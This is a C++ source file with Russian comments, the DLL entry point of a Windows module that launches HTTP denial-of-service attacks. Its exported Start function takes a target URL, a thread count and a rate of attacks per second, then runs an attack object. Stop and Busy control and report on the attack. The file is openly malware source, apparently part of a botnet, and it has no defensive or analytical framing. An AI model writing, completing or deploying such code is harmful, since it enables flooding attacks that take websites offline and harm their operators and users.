// dllmain.cpp: определяет точку входа для приложения DLL.
#include <windows.h>

#include "Main.h"
#include "GetApi.h"
#include "Strings.h"
#include "DDOSClasses.h"


//#pragma comment(linker, "/ENTRY:DDOSDllMain" )


// Глобальные данные длл
TDDOS *DDOS = NULL;  // Класс атаки



//----------------------------------------------------------------------
//  StartHTTP - Функция запускает HTTP DDOS атаку
//
//  URL - Адрес атакуемого сайта

//  Threads - Количество потоков атаки
//  
//  AttemptsPerSecond - Количество атак в секунду с одного потока
//
//  Flags - Зарезервировано
//
// Результат - В случае успеха функция возвращает 0, в противном случае
//             функци возвращает код ошибки
//----------------------------------------------------------------------
 int WINAPI Start(char* URL, DWORD Threads, DWORD AttemptsPerSecond, DWORD Flags)
{
	InitializeAPI();
	if (DDOS) return 1;
		

	if (STRA::IsEmpty(URL)) return 2;
			
	
	DDOS = new TDDOS();


	DDOS->URL = URL;

	if (Threads)
		DDOS->MaxThreads = Threads;

	
	if (AttemptsPerSecond)
		DDOS->AttemptsPerSecond = AttemptsPerSecond;

	// Запускаем атаку
	BOOL R = DDOS->Execute(false);

	return (R) ? 0 : -1;
}



void WINAPI Stop()
{
	if (DDOS)
	{
		TDDOS *TMP = DDOS;
		DDOS = NULL;
		TMP->Terminate();
	}
}

BOOL WINAPI Busy()
{
	return (DDOS) ? DDOS->Busy() : FALSE;
}





BOOL APIENTRY DDOSDllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved)
{
	return TRUE;
}


